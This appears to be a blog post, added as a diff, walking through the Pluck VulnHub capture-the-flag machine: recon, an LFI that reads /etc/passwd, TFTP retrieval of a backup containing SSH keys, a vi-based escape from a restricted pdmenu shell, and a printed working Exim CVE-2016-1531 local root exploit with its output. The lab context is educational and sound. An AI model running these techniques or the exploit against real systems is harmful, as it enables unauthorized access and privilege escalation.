@@ -1,0 +1,369 @@
+---
+layout: post
+title: "Got Pluck?"
+date: 2017-07-06 06:28:41 -0400
+comments: true
+categories: [penetration testing, writeups]
+keywords: pluck, pluck vm, pluck vulnhub, pluck writeup, pluck ctf, pluck walkthrough, pluck solution
+description: Pluck writeup
+---
+
+New day, new machine to hack! Today's target is called Pluck.
+
+<!-- more -->
+
+## Recon
+
+Nmap results:
+
+``` 
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
+|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL (unauthorized)
+5355/tcp open  llmnr?
+```
+
+First order of business, the web server:
+
+{% img center /images/pentest/pluck/pluck.png 'pluck' 'pluck' %}
+
+I ran Nikto on it and it revealed a couple of vulnerabilities:
+
+``` 
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
++ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-3092: /admin.php: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)
+```
+
+First, I went to the admin page and it seems vulnerable to SQL injection:
+
+{% img center /images/pentest/pluck/admin.png 'admin' 'admin sqli' %}
+
+I fired up sqlmap but I couldn't get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at */etc/passwd*:
+
+``` 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:108:65534::/var/lib/lxd/:/bin/false
+uuidd:x:109:114::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+```
+
+The last entry is interesting. I used the LFI to look at the script:
+
+``` 
+########################
+# Server Backup script #
+########################
+
+#Backup directories in /backups so we can get it via tftp
+
+echo "Backing up data"
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
+echo "Backup complete"
+```
+
+A TFTP reference, and I didn't scan for UDP ports. I went back to Nmap real quick:
+
+``` 
+nmap -T4 -sU -p69 192.168.217.147
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-06 09:59 EDT
+Nmap scan report for 192.168.217.147
+Host is up (0.00016s latency).
+PORT   STATE         SERVICE
+69/udp open|filtered tftp
+```
+
+I got the archive via TFTP:
+
+``` 
+tftp 192.168.217.147
+tftp> get /backups/backup.tar
+Received 1824718 bytes in 1.4 seconds
+```
+
+Extracted it to find some home directory contents, besides the source for the website:
+
+``` 
+tar -xvf backup.tar 
+home/
+home/bob/
+home/bob/.bashrc
+home/bob/.sudo_as_admin_successful
+home/bob/.profile
+home/bob/.bash_logout
+home/paul/
+home/paul/keys/
+home/paul/keys/id_key3.pub
+home/paul/keys/id_key2.pub
+home/paul/keys/id_key2
+home/paul/keys/id_key4.pub
+home/paul/keys/id_key5.pub
+home/paul/keys/id_key6
+home/paul/keys/id_key1
+home/paul/keys/id_key5
+home/paul/keys/id_key1.pub
+home/paul/keys/id_key6.pub
+home/paul/keys/id_key4
+home/paul/keys/id_key3
+home/paul/.bashrc
+home/paul/.profile
+home/paul/.bash_logout
+home/peter/
+home/peter/.bashrc
+home/peter/.profile
+home/peter/.bash_logout
+var/www/html/
+var/www/html/fonts/
+var/www/html/fonts/glyphicons-halflings-regular.svg
+var/www/html/fonts/glyphicons-halflings-regular.woff2
+var/www/html/fonts/glyphicons-halflings-regular.ttf
+var/www/html/fonts/glyphicons-halflings-regular.woff
+var/www/html/fonts/glyphicons-halflings-regular.eot
+var/www/html/about.php
+var/www/html/index.php
+var/www/html/footer.php
+var/www/html/css/
+var/www/html/css/bootstrap.css.map
+var/www/html/css/bootstrap.min.css.map
+var/www/html/css/bootstrap-theme.css
+var/www/html/css/bootstrap-theme.min.css
+var/www/html/css/bootstrap.min.css
+var/www/html/css/bootstrap-theme.min.css.map
+var/www/html/css/bootstrap-theme.css.map
+var/www/html/css/bootstrap.css
+var/www/html/header.php
+var/www/html/admin.php
+var/www/html/js/
+var/www/html/js/jquery.min.js
+var/www/html/js/bootstrap.js
+var/www/html/js/npm.js
+var/www/html/js/bootstrap.min.js
+```
+
+Bob's directory:
+
+``` 
+root@kali:~/home/bob# ls -la
+total 20
+drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
+drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
+-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
+-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
+-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful
+```
+
+That sudo file was empty. On to paul:
+
+``` 
+root@kali:~/home/paul# ls -la
+total 24
+drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
+drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
+-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
+drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
+-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
+root@kali:~/home/paul# ls -la keys/
+total 56
+drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
+drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
+-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
+-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
+-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
+-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
+-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
+-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
+-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
+-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub
+```
+
+It looks like paul didn't put much effort into securing his SSH keys. Lastly, peter:
+
+``` 
+root@kali:~/home/peter# ls -la
+total 20
+drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
+drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
+-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
+-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile
+```
+
+## Privilege escalation
+
+Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:
+
+{% img center /images/pentest/pluck/pdmenu.png 'pdmenu' 'pdmenu' %}
+
+So, what is pdmenu?
+
+> Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
+> for inexperienced users, or it can just be ran at the command line as a handy menu.
+
+Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a [SANS article](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) about this exact topic. To get a proper shell, I typed the following in vi's command mode:
+
+``` 
+:set shell=/bin/bash
+:!bash
+``` 
+
+That dropped me into paul's shell:
+
+``` 
+paul@pluck:~$ id
+uid=1002(paul) gid=1002(paul) groups=1002(paul)
+```
+
+SUID enumeration led me to the next step:
+
+``` 
+paul@pluck:~$ find / -perm -4000 2>/dev/null
+/usr/exim/bin/exim-4.84-7
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/s-nail/s-nail-privsep
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/su
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/ping
+/bin/ntfs-3g
+```
+
+Exim is a MTA similar to sendmail. Googling for an exploit yielded a [local root exploit](https://www.exploit-db.com/exploits/39535/). I used vi to create a shell script with the exploit code, changed it to executable and ran it:
+
+``` 
+paul@pluck:~$ vi rootme.sh 
+paul@pluck:~$ cat rootme.sh 
+echo [ CVE-2016-1531 local root exploit
+cat > /tmp/root.pm << EOF
+package root;
+use strict;
+use warnings;
+ 
+system("/bin/sh");
+EOF
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
+
+paul@pluck:~$ ./rootme.sh 
+[ CVE-2016-1531 local root exploit
+# whoami
+root
+```
+
+The flag is mine!
+
+``` 
+# cat /root/flag.txt
+
+Congratulations you found the flag
+
+---------------------------------------
+
+######   ((((((((((((((((((((((((((((((
+#########   (((((((((((((((((((((((((((
+,,##########   ((((((((((((((((((((((((
+@@,,,##########   (((((((((((((((((((((
+@@@@@,,,##########                     
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+@@@@@@,,,##########                    
+@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+```
+
+Interesting twist on this VM with the pdbmenu escape!
+
+**Learn more**
+
+- [escape restricted Linux shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
+
+``` 
+ _________________________________________
+/ Q: How many Zen masters does it take to \
+| screw in a light bulb? A: None. The     |
+| Universe spins the bulb, and the Zen    |
+| master stays out                        |
+|                                         |
+\ of the way.                             /
+ -----------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+```
+
